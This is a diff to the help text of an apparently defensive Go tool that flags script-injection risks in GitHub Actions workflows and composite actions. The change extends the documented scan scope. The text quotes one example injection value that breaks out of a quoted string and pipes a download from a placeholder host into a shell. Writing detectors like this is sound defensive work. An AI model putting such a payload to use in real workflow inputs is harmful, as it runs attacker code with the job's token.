@@ -14,8 +14,10 @@ func Cmd() *cobra.Command {
 			"interpolated value becomes SYNTAX rather than data. A workflow_dispatch input of\n" +
 			"`v1\"; curl evil.sh | sh #` interpolated into a run: line executes the curl, with\n" +
 			"whatever the job's token can reach.\n\n" +
-			"Checks both this repo's workflows and instance-template's — the delivered ones\n" +
-			"matter most, because an injection there is every adopter's. Flags what someone\n" +
+			"Checks four trees — this repo's workflows and composite actions, and the\n" +
+			"delivered copies of both under instance-template/. The delivered ones matter\n" +
+			"most, because an injection there is every adopter's, and the actions matter\n" +
+			"because actionlint cannot read them at all. Flags what someone\n" +
 			"outside this repo can set: `inputs.*` and `github.event.*` (whoever dispatches or\n" +
 			"calls the workflow, and whoever opened the pull request), the branch-name\n" +
 			"contexts, bare `github` for `toJSON(github)`, and `env.*` — which is the remedy's\n" +
